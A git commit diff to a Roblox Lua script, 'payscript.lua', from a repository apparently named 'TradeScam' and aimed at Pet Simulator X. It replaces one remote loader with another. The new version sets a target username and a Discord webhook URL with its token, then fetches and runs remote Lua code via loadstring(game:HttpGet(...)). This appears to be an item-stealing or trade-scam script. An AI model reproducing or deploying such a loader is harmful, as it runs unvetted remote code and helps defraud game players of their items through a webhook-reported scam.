204f6f1d50ad217c4586e89f5f0fba4bb2d2bbf3
bithui <104423014+bithui@users.noreply.github.com>
2023-03-06 19:24:11 +0700

    Update payscript.lua

--- payscript.lua
+++ payscript.lua
@@ -1,1 +1,4 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/bithui/TradeScam/main/payscriptpetsimx.lua"))()
+UserName = "sehaycuchay"
+Webhook = "https://discord.com/api/webhooks/1076735100202520627/9Zh_IsO8lautLzpnjrBLbn6bE7ZLj2lhp02iV4JVT54JdqA7dDRTqIpL5jECxMzYCXfY" -- optional delete the whole line if you don't want it
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/rizzhub/main/New.lua"))()
